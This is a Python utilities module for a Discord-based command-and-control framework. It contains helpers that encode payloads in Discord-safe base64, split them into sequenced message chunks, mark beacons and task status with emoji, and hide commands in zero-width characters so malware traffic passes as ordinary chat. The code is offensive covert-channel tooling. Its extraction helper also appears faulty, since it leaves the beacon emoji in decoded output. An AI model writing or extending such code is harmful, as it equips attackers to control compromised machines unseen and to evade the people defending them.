# c2_frameworks/discord/utils.py
"""
Discord C2 Shared Utilities
- Base64 → Discord-safe encoding (emoji + zero-width + alphanumeric)
- Reaction-based beaconing
- Message chunking & sequencing
- Steganography helpers for hiding payloads in memes
"""

import base64
import secrets
import string
from typing import List

# Discord-safe alphabet (no special chars that break embeds)
DISCORD_SAFE = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789-_"

# Zero-width + emoji beacon markers
ZWSP = "\u200B"      # Zero-width space
ZWJ = "\u200D"       # Zero-width joiner
ZWNJ = "\u200C"      # Zero-width non-joiner
BEACON_EMOJI = "🔴"   # Online beacon
ACK_EMOJI = "✅"      # Task received
DONE_EMOJI = "🏁"     # Task complete

def discord_safe_b64(data: bytes) -> str:
    """Encode to base64 using only Discord-safe chars"""
    b64 = base64.b64encode(data).decode()
    # Replace +/ with -_ and remove padding
    safe = b64.replace("+", "-").replace("/", "_").rstrip("=")
    return safe

def discord_safe_b64_decode(s: str) -> bytes:
    """Decode Discord-safe base64"""
    s = s.replace("-", "+").replace("_", "/")
    # Restore padding
    s += "=" * ((4 - len(s) % 4) % 4)
    return base64.b64decode(s)

def chunk_payload(payload: str, max_len: int = 1900) -> List[str]:
    """Split payload into Discord message-sized chunks with sequencing"""
    chunks = [payload[i:i+max_len] for i in range(0, len(payload), max_len)]
    return [f"[{i+1}/{len(chunks)}] {chunk}" for i, chunk in enumerate(chunks)]

def hide_in_emoji(payload: str) -> str:
    """Hide small payloads in zero-width + emoji (for beacons/tasks)"""
    encoded = "".join(f"{ZWSP}{c}{ZWJ}" if i % 2 == 0 else f"{ZWNJ}{c}{ZWSP}" for i, c in enumerate(payload))
    return f"{BEACON_EMOJI} {encoded}"

def extract_from_emoji(text: str) -> str:
    """Extract hidden payload from zero-width stego"""
    cleaned = text.replace(ZWSP, "").replace(ZWJ, "").replace(ZWNJ, "")
    return cleaned.strip()

def generate_task_id() -> str:
    return secrets.token_hex(6)